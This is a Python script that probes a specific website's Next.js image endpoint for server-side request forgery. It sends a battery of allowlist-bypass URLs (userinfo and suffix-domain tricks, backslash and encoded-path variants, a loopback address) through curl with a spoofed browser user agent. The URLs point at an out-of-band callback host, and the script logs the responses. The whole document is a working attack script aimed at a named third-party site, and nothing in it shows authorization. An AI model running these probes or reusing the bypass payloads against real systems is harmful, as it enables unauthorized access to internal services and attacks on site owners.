import subprocess, urllib.parse, os
B="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
H="oob65df84b492ab.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
ALLOW=["images.ctfassets.net","cdn.contentful.net","cdn.contentful.com","videos.ctfassets.net"]
tests=[
 ("oob-plain","http://%s/ssrf2"%H),
 ("oob-https","https://%s/ssrf2"%H),
 ("userinfo-allow-oob","https://%s@%s/a.png"%(ALLOW[0],H)),
 ("userinfo-oob-allow","https://%s@%s/a.png"%(H,ALLOW[0])),
 ("suffix-allow-oob","https://%s.%s/a.png"%(ALLOW[0],H)),
 ("allow-suffix-oob","https://%s.%s/a.png"%(H,ALLOW[0])),
 ("path-trick","https://%s/%%2f%s/a.png"%(ALLOW[0],H)),
 ("backslash","https://%s\\@%s/a.png"%(ALLOW[0],H)),
 ("at-in-path","https://%s/a.png@%s"%(ALLOW[0],H)),
 ("other-allow-1","https://%s/x.png"%ALLOW[1]),
 ("other-allow-2","https://%s/x.png"%ALLOW[2]),
 ("other-allow-3","https://%s/x.png"%ALLOW[3]),

 ("no-scheme-oob","//%s/a.png"%H),
 ("numeric-ip","http://127.0.0.1/x.png"),
 ("local-rel","/_next/static/x.png"),
]
for name,u in tests:
    url=B+"/_next/image?"+urllib.parse.urlencode({"url":u,"w":"256","q":"75"})
    o="/tmp/sp_%s"%name; hh="/tmp/sph_%s"%name
    for f in (o,hh):
        if os.path.exists(f): os.remove(f)
    try:
        r=subprocess.run(["curl","-s","-o",o,"-D",hh,"-w","%{http_code} %{size_download} %{content_type}","-A",UA,"--max-time","20",url],capture_output=True,text=True,timeout=30)
        hdr=open(hh).read() if os.path.exists(hh) else ""
        mpath=" ".join(l for l in hdr.splitlines() if l.lower().startswith("x-matched-path"))
        body=open(o,"rb").read()[:60] if os.path.exists(o) else b""
        print("%-22s %-32s %-20s %-50s"%(name,r.stdout.strip(),mpath,body))
    except Exception as e:
        print(name,"ERR",e)
